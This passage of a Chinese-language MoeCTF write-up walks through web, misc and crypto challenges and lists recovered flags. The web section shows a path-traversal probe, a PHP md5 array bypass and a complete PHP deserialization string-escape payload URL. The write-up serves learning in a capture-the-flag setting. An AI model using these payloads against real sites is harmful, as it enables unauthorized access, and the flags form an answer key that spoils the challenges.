BeautifulSoup, Comment</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_moectf</span>(<span class="params">comment</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;moectf&quot;</span> <span class="keyword">in</span> comment</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    base_url = <span class="string">&quot;https://example.com/?id=&quot;</span>  <span class="comment">#添加自己的URL</span></span><br><span class="line">    found_moectf = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> id_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1001</span>):</span><br><span class="line">        url = base_url + <span class="built_in">str</span>(id_num)</span><br><span class="line">        response = requests.get(url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            soup = BeautifulSoup(response.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">            comments = soup.find_all(string=<span class="keyword">lambda</span> text: <span class="built_in">isinstance</span>(text, Comment))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> index, comment <span class="keyword">in</span> <span class="built_in">enumerate</span>(comments, start=<span class="number">1</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Comment <span class="subst">&#123;index&#125;</span> at <span class="subst">&#123;url&#125;</span> (ID: <span class="subst">&#123;id_num&#125;</span>): <span class="subst">&#123;comment&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> found_moectf <span class="keyword">and</span> check_for_moectf(comment):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Found &#x27;moectf&#x27; in comment at <span class="subst">&#123;url&#125;</span> (ID: <span class="subst">&#123;id_num&#125;</span>): <span class="subst">&#123;comment&#125;</span>&quot;</span>)</span><br><span class="line">                    found_moectf = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span>  <span class="comment"># 找到后立即结束当前页面的注释检查</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Failed to fetch the webpage at <span class="subst">&#123;url&#125;</span>.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 添加时间间隔，模拟正常的访问速度</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)  <span class="comment"># 在每个请求之后等待1秒</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> found_moectf:</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 找到 moectf 后立即结束整体检查</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><strong>moectf{script_helps_QKmIks5AEfKv4t-VhXQvlIGufYuK5bLp}</strong></p><h3 id="meo-图床"><a href="#meo-图床" class="headerlink" title="meo 图床"></a>meo 图床</h3><p>   file_get_contents()  php 弱类型比较</p><p><img src="https://s2.loli.net/2024/03/07/sPjDJKLeF8ulYbS.png" alt=""></p><p>正常流程上传图片之后</p><p><img src="https://s2.loli.net/2024/03/07/ZwBgreHDSq2Yy3L.png" alt=""></p><p><strong>经过 bp 抓包发现 name 参数里的值为文件名，改成 flag 看回显</strong></p><p><img src="https://s2.loli.net/2024/03/07/CUqxgEFWm3QnTzu.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/bI4Q1vGXxShqJDe.png" alt=""></p><p><strong>尝试../，最后在根目录处得到提示</strong></p><p><img src="https://s2.loli.net/2024/03/07/GSzMH6iYAaqu4tx.png" alt=""></p><p><strong>直接访问 URL/Fl3g_n0t_Here_dont_peek!!!!!.php</strong></p><p><img src="bYGmjoxiRVx" alt=""></p><p><strong>简单弱类型md5比较，直接数组绕过<br>?param1[]=1&amp;param2[]=2</strong></p><p><img src="https://s2.loli.net/2024/03/07/rvDulM1423YCp5R.png" alt=""></p><p><strong>moectf{oops<em>file_get_contents_controllable_Vr83kqkQn07GeQ_FSCvDh</em>-KAXgF7mLP}</strong></p><h3 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h3><p>反序列化漏洞 字符串逃逸</p><p><img src="https://s2.loli.net/2024/03/07/eA4WuVPmNLdX9bi.png" alt=""></p><p>Hanxin.exe.php 里也有源文件</p><p><img src="https://s2.loli.net/2024/03/07/K1Cq3dcmEp2waDx.png" alt=""></p><p><strong>从下面读吧，flag是环境变量，只要满足让Spear_Owner=MaoLei就可以得到flag<br>Spear_Owner是类Omg_It_Is_So_Cool_Bring_Me_My_Flag的变量<br>再看第一张图的$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);<br>$Nwe_visitor调用了此类创建实例，然后被反序列化后赋值给变量before<br>before再运行了Make_a_Move($move)方法，也就是第二张图十三枪那里,其作用是对符合条件的字符串进行替换<br>结束此方法后的值给到after，并对其进行序列化，接着运行Omg_It_Is_So_Cool_Bring_Me_My_Flag类里的判断，如果此时Spear——Owner的值是MaoLei的话就可以获得flag了</strong></p><p>这里在十三枪替换处存在一个字符串逃逸的漏洞，具体原理参考<a href="https://blog.csdn.net/qq_43431158/article/details/108210822">资料</a></p><p>我这里用第一枪，替换一个逃逸一个字符</p><p>关键 payload：<code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code> 占 35 格</p><p>那就给 35 个第一枪上去 <code>di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code></p><p>这里总共 420 格，最后补其句式即可</p><p><strong>EXP：<br>GET:URL/?chant=o:34:”Omg_It_Is_So_Cool_Bring_Me_My_Flags”:2{s:5:”Chant”s:420:”di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang”;s:11:”Spear_Owner”;s:6:”MaoLei”;}</strong></p><p><img src="https://s2.loli.net/2024/03/07/hLwFTW6SYnQmAU1.png" alt=""></p><blockquote><p>这里还可以用第七枪，第七枪一次逃逸 5 格<br><br></p></blockquote><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc-入门指北"><a href="#misc-入门指北" class="headerlink" title="misc 入门指北"></a>misc 入门指北</h3><p>   base64</p><p><img src="https://s2.loli.net/2024/03/07/lgX2kOVTrIesMS9.png" alt=""></p><p><strong>base64解码</strong></p><p><img src="https://s2.loli.net/2024/03/07/V32EnUoTMLHvmZP.png" alt=""></p><p><strong>moectf{h@v3<em>fun</em>@t<em>m15c</em>!}</strong></p><h3 id="打不开的图片-1"><a href="#打不开的图片-1" class="headerlink" title="打不开的图片 1"></a>打不开的图片 1</h3><p>jpg 文件头缺失，exif 隐写，hex</p><p><strong>拿到空文件去 010 看看</strong></p><p><img src="https://s2.loli.net/2024/03/07/JkOfbMltdzyZrHm.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/ZXg5tv13ydFBkuD.png" alt=""></p><p>尾巴 FF D9 符合 jpg，考查文件头缺失</p><p>补充 jpg 文件头即可</p><p><img src="https://s2.loli.net/2024/03/08/mlOeSJrGjwCYhHL.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/J8k6SGgaEU7fX34.png" alt=""></p><p>保存后，改后缀为.jpg 后打开</p><p><img src="https://s2.loli.net/2024/03/07/Na8ws5WZCtemvd2.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/aX7xbN1fCvFOAin.png" alt=""></p><p><strong>没有东西，才看到 ascii 里有 exif，考虑属性藏了东西</strong></p><p><img src="https://s2.loli.net/2024/03/08/ViPvytK4SAw23YJ.png" alt=""></p><p><strong>藏了 hex，解码</strong></p><p><img src="https://s2.loli.net/2024/03/07/WO2Xk6oibzVRax5.png" alt=""></p><p><strong>moectf{XDU_i5_v3ry_6e@u2ifu1}</strong></p><h3 id="打不开的图片-2"><a href="#打不开的图片-2" class="headerlink" title="打不开的图片 2"></a>打不开的图片 2</h3><p>png 文件头尾</p><p><img src="https://s2.loli.net/2024/03/07/M14avGSqhmByEYe.png" alt=""></p><p><strong>根据提示猜测文件头尾不相同</strong></p><p><img src="https://s2.loli.net/2024/03/07/iprHoFQ7XKMcEyJ.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/TPizcvglEqFSXps.png" alt=""></p><p>改头为 png 格式即可</p><p><img src="https://s2.loli.net/2024/03/07/KypDFVbLUIgn78v.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/629yAYpGxNFwOcK.png" alt=""></p><p>刚好改前面四个就行</p><p><img src="https://s2.loli.net/2024/03/08/FYUd7LCecWHjQkn.png" alt=""></p><p><strong>moectf{D0<em>yOu_1ik3_Bo7@ck</em>?}</strong></p><h3 id="狗子-1-普通的猫"><a href="#狗子-1-普通的猫" class="headerlink" title="狗子(1) 普通的猫"></a>狗子(1) 普通的猫</h3><p>010editor</p><p><strong>题目给的一个 wav 文件，但 flag 实际就在 ascii 最底下</strong></p><p><img src="https://s2.loli.net/2024/03/07/WUQpRZrE6mOfJoV.png" alt=""></p><p><strong>moectf{eeeez_f1ag_as_A_G1ft!}</strong></p><h3 id="building-near-lake"><a href="#building-near-lake" class="headerlink" title="building_near_lake"></a>building_near_lake</h3><p>   社工</p><blockquote><p>直说过程</p></blockquote><p><strong>百度识图，社到地址为**</strong>厦门大学翔安校区图书馆**</p><p><strong>然后百度地图拾取器，定位直接提取经纬度</strong></p><p><strong>设备信息在 exif 里面有型号，复制到网上一搜就是红米 k60，再搜其发布时间即可</strong></p><p><strong>moectf{P0sT_Y0uR_Ph0T0_wiTh_0Riginal_File_is_n0T_a_g00d_idea_YlJf!M3rux}</strong></p><h3 id="尊嘟假嘟？"><a href="#尊嘟假嘟？" class="headerlink" title="尊嘟假嘟？"></a>尊嘟假嘟？</h3><p>尊嘟假嘟加密，blowfish 加密，base58(区块链地址加密方式)，</p><p>先拿到 txt 文本</p><p><img src="https://s2.loli.net/2024/03/07/Z51VGSjry9E3YKO.png" alt=""></p><p>在 github 里搜索到对应加密    <a href="https://github.com/SnailSword/zdjd">GitHub - SnailSword/zdjd: 人类语言与尊嘟语的转换器。</a></p><p><img src="https://s2.loli.net/2024/03/07/hgLKuZeUCtRHNvl.png" alt=""></p><p>在线解密即可</p><p><img src="https://s2.loli.net/2024/03/07/MCEU5fw9mVsvrd6.png" alt=""></p><p><strong>密码已经给出<br>key：字符串zundujiadu?哈希加密后b60开头哈希值末尾8个字节<br>iv（偏移量）：字符串dududu?哈希加密后272开头哈希值末尾8个字节<br>hint1：比特币地址的加密方式<br>hint2：此次加密的名称为“bl*</strong>sh”**</p><p><a href="https://tool.ip138.com/hash/">哈希加密算法 MD5|SHA-1|SHA-2|SHA-256|SHA-512|SHA-3|RIPEMD-160 哈希 Hash 加密算法 iP138 在线工具</a></p><p><img src="https://s2.loli.net/2024/03/08/AkcVIhHD4KNe5uy.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/AXaQfmkOZtirco8.png" alt=""></p><p><strong>比特币区块链（三） | 比特币地址</strong></p><p><img src="https://s2.loli.net/2024/03/07/2OSrMuo1LjgfIib.png" alt=""></p><p><strong>cyberchef 直接搜 bl 找对应的就行</strong></p><p><img src="https://s2.loli.net/2024/03/07/Mr6LaP2e4KWDctS.png" alt=""></p><p>总结如下</p><p><img src="https://s2.loli.net/2024/03/08/1xtP6dMSnDefjJu.png" alt=""></p><p><strong>赛博厨子解密</strong></p><p><img src="https://s2.loli.net/2024/03/08/ADiGydP3HqmQET8.png" alt=""></p><p><strong>moectf{wow_you_aRe_the_masteR_of_Zundujiadu_92WPIBung92WPIBung9?WPIBung}</strong></p><h3 id="烫烫烫"><a href="#烫烫烫" class="headerlink" title="烫烫烫"></a>烫烫烫</h3><p>UTF-7  AES</p><p><img src="https://s2.loli.net/2024/03/08/5ABMdz4LOUErIui.png" alt=""></p><p>坤坤，以后做全试一遍得了，目前还不太懂这类编码…</p><p><img src="https://s2.loli.net/2024/03/07/CXYEKiQlb72mIGL.png" alt=""></p><p>文本内容可以用 decode text 解决，选择 UTF-7 模式，并且 input ouput 的右下角都要选择 UTF-7</p><p>**这是你的flag：</p><p>a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262</p><p>但是flag用AES加密了，key是下面这行字的sha256（hash值的开头是b34edc782d68fda34dc23329）</p><p>所以说，codepage真的很重要啊（**</p><p>开头有了但没有后面，试试加密下后面的文本</p><p><img src="https://s2.loli.net/2024/03/08/CR9TMjrxoyA6gJd.png" alt=""></p><p>给了句子的前面部分，所以这里直接把句子的 sha256 复制就行</p><p><img src="https://s2.loli.net/2024/03/07/DBkPAptg2Yem6bh.png" alt=""></p><p>这里记录下各个位置的参数选择</p><h3 id="狗子-2-照片"><a href="#狗子-2-照片" class="headerlink" title="狗子(2) 照片"></a>狗子(2) 照片</h3><p>lsb 隐写</p><p><strong>尝试了很多，一开始 zsteg 还不行，后来 m 神说图片太大，要改宽高变小点再试</strong></p><p><img src="https://s2.loli.net/2024/03/08/7jhT95yXAsfle4d.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/6Ak4CVqX8FSnGwz.png" alt=""></p><p><strong>高度改成和宽度一样再试试</strong></p><p><img src="https://s2.loli.net/2024/03/07/NwaiB5zRJt7Ipfg.png" alt=""></p><p><strong>moectf{D0ggy_H1dd3n_1n_Pho7o_With_LSB!}</strong></p><h3 id="base-乐队"><a href="#base-乐队" class="headerlink" title="base 乐队"></a>base 乐队</h3><p>base 嵌套   栅栏密码</p><p><strong>拿到字符串放到 cyberchef 中</strong></p><p><img src="https://s2.loli.net/2024/03/07/ywFGurgQD2Ekodj.png" alt=""></p><p><strong>看到两个=但不是都在最后，考虑可能有凯撒或者栅栏或者 rot 啥的吧，直接工具梭哈一下</strong></p><p><img src="https://s2.loli.net/2024/03/07/86zZsEtaOfmTNkR.png" alt=""></p><p><strong>栅栏密码，把明文再放入 cyberchef 中</strong></p><p><img src="https://s2.loli.net/2024/03/07/3oa1HrSMDdyhslF.png" alt=""></p><p><strong>moectf{Th4<em>6@nd_1nc1ud45_F3nc4</em>@nd_b@s3}</strong></p><h3 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h3><p>   ppt 隐写</p><p><img src="https://s2.loli.net/2024/03/07/IK6cAQmSjGJCD5w.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/MTRg1XKjaqDFu9L.png" alt=""></p><p><strong>附件下来看到里面有 ppt，结合题目说不是压缩包，尝试改后缀.ppt</strong></p><p><img src="https://s2.loli.net/2024/03/07/VApag8w1WZUEI9s.png" alt=""></p><p><strong>Ctrl+a 全选找找是否有藏起来的文字框</strong></p><p><strong>发现第二页是把字体改白色和背景混起来了</strong></p><p><img src="https://s2.loli.net/2024/03/07/EYflCBhgHmTceA3.png" alt=""></p><p><strong>第三页同样方法，藏在图片后面，但 123456 是假的，注释才是 flag 内容</strong></p><p><img src="https://s2.loli.net/2024/03/07/Q4BI6Pfpmnh1w9r.png" alt=""></p><p><strong>第四页同理</strong></p><p><img src="https://s2.loli.net/2024/03/08/BFqMDRHIhof1rag.png" alt=""></p><p><strong>最后一页按次方法没用，但估计最后一段就在这里了，根据前面得到 flag 为**</strong>moectf{2ip_?_n0_i4**</p><p><strong>也可以猜到是 ppt 或者 pptx，估计一直爆破也能出</strong></p><p><strong>通过 m 神提示：还可以 ctrl+f 搜索一下</strong></p><p><img src="https://s2.loli.net/2024/03/07/coy3IluUwY8O4WR.png" alt=""></p><p><strong>锁定在这个框，但是不是改文字颜色，啥都找不到，这时 m 神发了个视频</strong></p><p>得一直拖着它才可以看到，最后得到 flag</p><p><strong>moectf{2ip_?_n0_i4_pp4x!}</strong></p><h3 id="机位查询"><a href="#机位查询" class="headerlink" title="机位查询"></a>机位查询</h3><p>社工</p><p><img src="https://s2.loli.net/2024/03/07/l5CchoUIGeiyZMT.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/YwugSjerdv7ARUa.png" alt=""></p><p><strong>第一张抓远处南京站，城市便捷，还有下面的店铺猪霸王</strong></p><p><strong>百度地图里面定位好后，切**</strong>3D<strong>**到这条路上一看，只有一栋高楼对应，jiashi</strong></p><p><img src="https://s2.loli.net/2024/03/07/OL2so5MuvBYPjyX.png" alt=""></p><p><strong>第二张很明显，百度地图直接定位中山路美食街，切**</strong>3D<strong>**进门口的路口处观察</strong></p><p><strong>对面只有一个博物馆和一个高楼，博物馆太矮所以锁定百盛广场   baisheng</strong></p><p><img src="https://s2.loli.net/2024/03/08/5iFsYPOgUdV7HQj.png" alt=""></p><p>第三张图可找死我了，这个拍摄角度非常刁钻，我抓的是时代丽都和中国人保还有 95500（太平洋保险）</p><p>定位也到了，但最后发现太平洋保险离另外两个特别远，后来才知道做法不对，这张图 exif 有经纬度</p><p><a href="https://www.strerr.com/cn/exif.html">在线查看图片经纬度<em>图片 Exif 信息</em>图片定位信息_GPS 信息 - StrErr.com</a></p><p><img src="https://s2.loli.net/2024/03/08/B6u5x2IoT8s1anN.png" alt=""></p><p>google 地图打开</p><p><img src="https://s2.loli.net/2024/03/08/AzFB6svRo7Wr3Ip.png" alt=""></p><p><strong>试了亚朵发现不行，后来百度地图也定位到这里才发现这栋楼叫汇金苑..         huijin</strong></p><p><img src="https://s2.loli.net/2024/03/07/iojJk5GIrZuTNmC.png" alt=""></p><p><strong>moectf{jiashi_baisheng_huijin}</strong></p><h3 id="狗子-3-寝室"><a href="#狗子-3-寝室" class="headerlink" title="狗子(3) 寝室"></a>狗子(3) 寝室</h3><p>压缩包套娃</p><blockquote><p>使用压缩包脚本（来自紫竹老公写的）</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> rarfile</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"></span><br><span class="line">a=<span class="number">9999</span></span><br><span class="line"><span class="keyword">while</span> a!=<span class="number">0</span>:</span><br><span class="line">  zipname=<span class="string">&#x27;shell&#x27;</span>+<span class="built_in">str</span>(a)+<span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">  <span class="keyword">if</span>(os.path.exists(zipname)):</span><br><span class="line">    zfile=zipfile.ZipFile(zipname)</span><br><span class="line">    zfile.extractall()</span><br><span class="line">    zfile.close()</span><br><span class="line">    a-=<span class="number">1</span></span><br><span class="line">  rarname=<span class="string">&#x27;shell&#x27;</span>+<span class="built_in">str</span>(a)+<span class="string">&#x27;.rar&#x27;</span></span><br><span class="line">  <span class="keyword">if</span>(os.path.exists(rarname)):</span><br><span class="line">    rfile=rarfile.RarFile(rarname)</span><br><span class="line">    rfile.extractall()</span><br><span class="line">    rfile.close()</span><br><span class="line">    a-=<span class="number">1</span></span><br><span class="line">  tarname=<span class="string">&#x27;shell&#x27;</span>+<span class="built_in">str</span>(a)+<span class="string">&#x27;.tar.gz&#x27;</span></span><br><span class="line">  <span class="keyword">if</span>(os.path.exists(tarname)):</span><br><span class="line">    rfile=tarfile.<span class="built_in">open</span>(tarname)</span><br><span class="line">    rfile.extractall()</span><br><span class="line">    rfile.close()</span><br><span class="line">    a-=<span class="number">1</span></span><br><span class="line">  zname=<span class="string">&#x27;shell&#x27;</span>+<span class="built_in">str</span>(a)+<span class="string">&#x27;.7z&#x27;</span></span><br><span class="line">  <span class="keyword">if</span>(os.path.exists(zname)):</span><br><span class="line">    file=py7zr.SevenZipFile(zname)</span><br><span class="line">    file.extractall()</span><br><span class="line">    file.close()</span><br><span class="line">    a-=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/07/HTJXwLzkmE9lWgr.png" alt=""></p><p><strong>moectf{Ca7_s133p1ng_und3r_zip_5hell5}</strong></p><h3 id="你想要-flag-吗"><a href="#你想要-flag-吗" class="headerlink" title="你想要 flag 吗"></a>你想要 flag 吗</h3><p>知识点 ：音频 lsb 隐写  rabbit 加密</p><p>拿到音频文件查看下频谱图</p><p><img src="https://s2.loli.net/2024/03/08/BEfYoP86i7UMA31.png" alt=""></p><p><strong>steghide</strong></p><p><img src="https://s2.loli.net/2024/03/08/X2FouNvfnkr4xV6.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/KvDYkizV6bom123.png" alt=""></p><p><strong>根据文件名和编码前缀可知为 rabbit 加密</strong></p><p><img src="https://s2.loli.net/2024/03/07/XgHKW8w2ACjJGDZ.png" alt=""></p><p><strong>moectf{Mu5ic<em>1s_v3ry_1nt23esting</em>!}</strong></p><h3 id="照片冲洗"><a href="#照片冲洗" class="headerlink" title="照片冲洗"></a>照片冲洗</h3><p>   图片分离 + 盲水印</p><p><img src="https://s2.loli.net/2024/03/07/1EcwadCNuPA5OZf.png" alt=""></p><p><strong>题目仅给了一张图，根据题目描述猜测是两张图的盲**</strong>水印<strong>**，这里先要把图片文件分成两张图</strong></p><p><img src="https://s2.loli.net/2024/03/07/RctwyNb1FTZjHUS.png" alt=""></p><p>010 搜索 png 文件尾发现有两个并且一个在中间一个在末尾，手工分离一下，并添加好文件头</p><p><strong>- PNG (png)，<br>文件头：89 50 4E 47 0D 0A 1A 0A<br>文件尾：AE 42 60 82</strong></p><p><img src="https://s2.loli.net/2024/03/07/wEyW7QAuarGg2eD.png" alt=""></p><p>利用工具操作即可</p><p><img src="https://s2.loli.net/2024/03/07/As29n4Uqej1TraJ.png" alt=""></p><blockquote><p><strong>注意模式和先后顺序均有讲究</strong></p></blockquote><p><img src="https://s2.loli.net/2024/03/07/tjZXKvqwlerFHdC.png" alt=""></p><p><strong>moectf{W0w_you_6@v3_1earn3d_blind_w@t3rma2k}</strong></p><h3 id="狗子-4-故乡话"><a href="#狗子-4-故乡话" class="headerlink" title="狗子(4) 故乡话"></a>狗子(4) 故乡话</h3><p>mc 脑洞题  附魔台语言</p><p><img src="https://s2.loli.net/2024/03/07/LHKkVC5xlr9hIiW.png" alt=""></p><p><strong>true 改 1，false 改 0</strong></p><p><img src="https://s2.loli.net/2024/03/07/fcKzw15nukHyG94.png" alt=""></p><p><strong>眯眼睛看隐隐约约好像有东西在里面</strong></p><p><strong>把 0 改.   1 改 0 </strong></p><p><img src="https://s2.loli.net/2024/03/07/YOsW5D2JydaiPcR.png" alt=""></p><p><strong>明显多了，紫竹思路是猜测附魔台的语言，果真啊牛逼</strong></p><p><img src="https://s2.loli.net/2024/03/08/pd7q2zRwEaD95ju.png" alt=""></p><p><strong>对照表翻译即可</strong></p><p><img src="https://s2.loli.net/2024/03/07/bTqgmOdE5l3pK16.png" alt=""></p><p><strong>moectf{dontanswer}</strong></p><h3 id="weird-package"><a href="#weird-package" class="headerlink" title="weird_package"></a>weird_package</h3><p>文件 hex 码的拼接   base64  raw-inflate</p><p><img src="https://s2.loli.net/2024/03/08/t6jToSyJhiZWsz5.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/mMywIAsaG9XYdfh.png" alt=""></p><p>010 打开压缩包看到很多压缩包隐写在里面</p><p>但是 binwalk 不出来，<strong>猜测是要自己拼接</strong></p><p>但是 <strong>bandizip 可以直接修复</strong></p><p><img src="https://s2.loli.net/2024/03/08/TS1QjbYOU3EHALk.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/gnKrIRpLk73SjQC.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/l843dHy7GESeLkh.png" alt=""></p><p>打开后都是类似 base64 的玩意，按队里佬提示用 cyberchef 解密</p><p><img src="https://s2.loli.net/2024/03/07/WTrKNXGdtuAqHnI.png" alt=""></p><p>八个假的，只有一个是真的 flag</p><p><img src="https://s2.loli.net/2024/03/07/rvtGiowLVNSynj3.png" alt=""></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="base-64"><a href="#base-64" class="headerlink" title="base_64"></a>base_64</h3><p>   逆向脚本</p><p><a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a>    pyc 在线编译，没工具的把题目的 pyc 文件放这里就行</p><p><img src="https://s2.loli.net/2024/03/08/Ls1gEUJIZ5CVX9F.png" alt=""></p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&quot;</span></span><br><span class="line">string1 = <span class="string">&quot;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure><p>把题目给的 str1，string1，string2 都替换脚本里的运行就可以了</p><p><img src="https://s2.loli.net/2024/03/08/koOmbn17Cdwjq9v.png" alt=""></p><p><strong>moectf{pYc_And_Base64~}</strong></p><h3 id="ccccc"><a href="#ccccc" class="headerlink" title="ccccc"></a>ccccc</h3><p>c 语言编程题</p><p><img src="https://s2.loli.net/2024/03/08/CwbJ63ergTEacWF.png" alt=""></p><p>学习 c 语言编程</p><p><strong>moectf{HAHA_C_1s_easy!}</strong></p><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>python 编程题</p><p><img src="https://s2.loli.net/2024/03/08/QCTdR7tAg6s8ulF.png" alt=""></p><p>运行得到 flag</p><p><strong>moectf{Pyth0n_1z_0ur_g00d_friendz}</strong></p><h3 id="runme"><a href="#runme" class="headerlink" title="runme"></a>runme</h3><p>cmd or powershell 运行</p><p>powershell 运行 runme.exe 即可</p><p><img src="https://s2.loli.net/2024/03/08/IpVn64rWahxgCJ1.png" alt=""></p><p><strong>moectf{0h_y0u_can_use_cmd!!!}</strong></p><h3 id="runme2"><a href="#runme2" class="headerlink" title="runme2"></a>runme2</h3><p>   kali 运行即可</p><p>先改个权限先：chmod 777 [文件]</p><p><img src="https://s2.loli.net/2024/03/08/PCMofQA81VtIgnN.png" alt=""></p><p><strong>moectf{Run_me_in_linux!}</strong></p><h3 id="crypto-入门指北"><a href="#crypto-入门指北" class="headerlink" title="crypto 入门指北"></a>crypto 入门指北</h3><p>经典 RSA</p><p><img src="https://s2.loli.net/2024/03/08/ZKdslGuB38x56Rk.png" alt=""></p><p>运行得到 flag</p><p><strong>moectf{weLCome_To_moeCTf_CRypTo_And_enjoy_THis_gAme!_THis_is_yoUR_fLAg!}</strong></p><h3 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h3><p>rot47 密码</p><p><strong>题目给的字符串结合提示一个一个试rot即可</strong></p><p><img src="https://s2.loli.net/2024/03/08/Bkg79Fsn6twILOe.png" alt=""></p><p><strong>moectf{rot47<em>is_just_a_simPle_letter_substitution_ciPher_EDpy5tpe5juNT</em>}</strong></p><h3 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a>可可的新围墙</h3><p>栅栏密码（w 